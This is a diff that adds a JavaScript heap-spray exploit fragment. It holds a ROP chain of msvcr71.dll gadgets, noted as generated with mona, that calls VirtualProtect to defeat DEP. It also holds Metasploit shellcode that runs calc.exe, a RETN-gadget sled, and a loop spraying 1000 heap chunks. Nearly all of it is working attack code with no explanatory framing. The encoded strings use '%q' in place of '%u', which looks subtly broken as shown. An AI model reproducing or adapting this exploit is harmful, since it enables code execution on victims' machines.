@@ -1,0 +1,69 @@
+﻿function padnum(n, numdigits)
+ {
+   n = n.toString();
+   var pnum = '';
+   if (numdigits > n.length)
+   {
+     for (z = 0; z < (numdigits - n.length); z++)
+      pnum += '0';
+   }
+   return pnum + n.toString();
+ }
+ var rop, calc, chunk_size, headersize, nopsled, nopsled_len, code;
+ var heap_chunks, i, codewithnum;
+//        
+// !mona rop -m msvcr71.dll
+// * changed from default mona rop chain output
+//
+ rop = unescape(
+ "%q2e4d%q7c36" +   //  0x7c362e4d, # POP EBP # RETN
+ "%q2e4d%q7c36" +   //  0x7c362e4d, # skip 4 bytes
+ "%qf053%q7c34" +   //  0x7c34f053, # POP EBX # RETN
+ "%q00c8%q0000" +   //  0x000000c8, # 0x000000c8-> ebx (size 200 bytes) *
+ "%q4364%q7c34" +   //  0x7c344364, # POP EDX # RETN
+ "%q0040%q0000" +   //  0x00000040, # 0x00000040-> edx
+ "%qf62d%q7c34" +   //  0x7c34f62d, # POP ECX # RETN
+ "%qe945%q7c38" +   //  0x7c38e945, # &Writable location
+ "%q496e%q7c36" +   //  0x7c36496e, # POP EDI # RETN
+ "%q6c0b%q7c34" +   //  0x7c346c0b, # RETN (ROP NOP)
+ "%q2adb%q7c37" +   //  0x7c372adb, # POP ESI # RETN
+ "%q15a2%q7c34" +   //  0x7c3415a2, # JMP [EAX]
+ "%q4edc%q7c34" +   //  0x7c344edc, # POP EAX # RETN
+ "%qa151%q7c37" +   //  0x7c37a151, # ptr to &VirtualProtect() - 0x0EF  *
+ "%q8c81%q7c37" +   //  0x7c378c81, # PUSHAD # ADD AL,0EF # RETN
+ "%q5c30%q7c34");   //  0x7c345c30, # ptr to 'push esp #  ret '
+//
+// ruby msfpayload windows/exec cmd=calc.exe J
+// windows/exec - 200 bytes
+// http://www.metasploit.com
+// VERBOSE=false, EXITFUNC=process, CMD=calc.exe
+//
+ calc = unescape(
+ "%qe8fc%q0089%q0000%q8960%q31e5%q64d2%q528b%q8b30" +
+ "%q0c52%q528b%q8b14%q2872%qb70f%q264a%qff31%qc031" +
+ "%q3cac%q7c61%q2c02%qc120%q0dcf%qc701%qf0e2%q5752" +
+ "%q528b%q8b10%q3c42%qd001%q408b%q8578%q74c0%q014a" +
+ "%q50d0%q488b%q8b18%q2058%qd301%q3ce3%q8b49%q8b34" +
+ "%qd601%qff31%qc031%qc1ac%q0dcf%qc701%qe038%qf475" +
+ "%q7d03%q3bf8%q247d%qe275%q8b58%q2458%qd301%q8b66" +
+ "%q4b0c%q588b%q011c%q8bd3%q8b04%qd001%q4489%q2424" +
+ "%q5b5b%q5961%q515a%qe0ff%q5f58%q8b5a%qeb12%q5d86" +
+ "%q016a%q858d%q00b9%q0000%q6850%q8b31%q876f%qd5ff" +
+ "%qf0bb%qa2b5%q6856%q95a6%q9dbd%qd5ff%q063c%q0a7c" +
+ "%qfb80%q75e0%qbb05%q1347%q6f72%q006a%qff53%q63d5" +
+ "%q6c61%q2e63%q7865%q0065");
+//
+ chunk_size = 0x40000;
+ headersize = 0x24;
+ nopsled = unescape("%q6224%q7c37"); // 0x7c376224 RETN [MSVCR71.dll]
+ nopsled_len = chunk_size - (headersize + rop.length + calc.length);
+ while (nopsled.length < nopsled_len)
+    nopsled += nopsled;
+ nopsled = nopsled.substring(0, nopsled_len);
+ code = nopsled + rop + calc;                             
+ heap_chunks = new Array();
+ for (i = 0 ; i < 1000 ; i++)
+ {
+    codewithnum = padnum(i,4) + code;
+    heap_chunks[i] = codewithnum.substring(0, codewithnum.length);
+ }
